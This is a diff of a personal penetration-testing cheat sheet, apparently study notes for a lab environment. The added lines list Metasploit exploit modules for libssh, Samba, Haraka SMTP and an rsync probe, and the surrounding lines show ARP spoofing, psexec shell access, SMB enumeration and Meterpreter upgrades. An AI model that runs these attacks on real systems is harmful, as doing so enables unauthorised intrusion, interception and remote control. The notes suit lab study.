@@ -9,8 +9,6 @@ load wmap
 wmap_sites -a ip 
 wmap_targets
 
-
-
 ENUM  -
 gobuster dir -u http://target.com -w /path/to/wordlist.txt
 enum4linux -a // smb*samba enum tool
@@ -63,11 +61,15 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 arpspoof -i eht1 -t targetip1 targetip2
 arpspoof -i eth1 -t targetip2 targetip1
 
+SSH -
+libssh_auth_bypass
+
+SAMBA -
+linux/samba/is_known_pipename
 
 
 SMB -
 ls -al /usr/share/nmap/scripts | grep -e "smb-*" // lists nmap scripts for smb // --script script - uses script
-
 smbclient -L host //check for anonymous login
 smbmap -H ip -u user -p pass 
 psexec.py user@ip cmd.exe // psawns cmd shell
@@ -136,6 +138,13 @@ use multi/manage/shell_to_meterpreter
 
 MYSQL -
 msssql 2012 is vulnerable to  mssql_clr_payload 
+
+SMTP -
+linux/smtp/haraka
+
+RSYNC -
+rsync rsync://target1.ine.local
+
 
 
 
